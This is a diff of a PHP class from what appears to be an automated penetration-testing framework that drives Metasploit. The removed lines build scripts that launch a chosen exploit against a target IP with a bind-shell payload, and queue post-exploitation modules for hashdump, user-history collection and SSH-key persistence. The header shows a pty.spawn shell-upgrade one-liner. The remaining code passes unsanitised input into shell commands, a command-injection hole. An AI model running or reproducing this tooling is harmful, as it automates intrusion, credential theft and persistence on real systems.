@@ -1066,60 +1066,21 @@ python -c 'import pty;pty.spawn(\"$shell\")' ");
     }
     
     
-    
     public function msf2search($cve){
-        
         $this->ssTitre(__FUNCTION__);
         $cve = trim($cve);
-        $sha1_hash = sha1($cve);
-        $filename_req = "$this->dir_tmp/$sha1_hash.search.rc";
-        $filename_rst = "$this->dir_tmp/$sha1_hash.search.rst";
-        if (!empty($cve)){
-            if (!file_exists($filename_req)){
-                $query = "echo 'db_status\nsearch type:exploit -S $cve\nexit\n' > $filename_req";
-                $this->requette($query);
-            }
-            if (!file_exists($filename_rst)){
-            $query = "msfconsole -q  -r $filename_req | grep -i \"exploit/\" | awk '{print $2}' | grep \"exploit/\" | tee $filename_rst" ;
-            return $this->req_ret_tab($query);
-            }
-            return file($filename_rst);
-        }
-        
-        
-        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
-        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
-        // set AutoRunScript post/linux/gather/enum_system
-        $query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
-        //$this->requette($query);
-        
-        
-    }
+        $query = "msfconsole -q -x 'search type:exploit -S $cve;exit' | grep -i \"exploit/\" | awk '{print $2}' | grep \"exploit/\" " ;
+        return $this->req_ret_tab($query);        
+    } 
     
-    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
-        
-        $this->ssTitre(__FUNCTION__);
-        $file_exploit = trim($file_exploit);
-        $sha1_hash = sha1($file_exploit);
-        $filename_req = "$this->dir_tmp/$sha1_hash.exec.rc";
-        $filename_rst = "$this->dir_tmp/$sha1_hash.exec.rst";
-        if (!empty($file_exploit)){
-            if (!file_exists($filename_req)){
-                $query = "echo 'db_status\nuse $file_exploit\nset RHOSTS $target_ip\n set RPORT $target_port\nset payload generic/shell_bind_tcp\nset LHOST $attacker_ip\nset LPORT $attacker_port\nrun\n' > $filename_req";
-                $this->requette($query);
-            }
-                $query = "msfconsole -q  -r $filename_req " ;
-                return $query;
-        }
-   }
+
+    
+
     
     public function msf2info($file_exploit){
         $this->ssTitre(__FUNCTION__);
-        $hash = sha1($file_exploit);
-        $file_rst = "$this->dir_tmp/$hash.info.rst";
-        $query = "msfconsole -q -x 'info $file_exploit;exit' | tee $file_rst " ;
-        if (file_exists($file_rst)) return file_get_contents($file_rst);
-        else return $this->req_ret_str($query);
+        $query = "msfconsole -q -x 'info $file_exploit;exit'" ;
+        return $this->req_ret_str($query);
     }
     
 
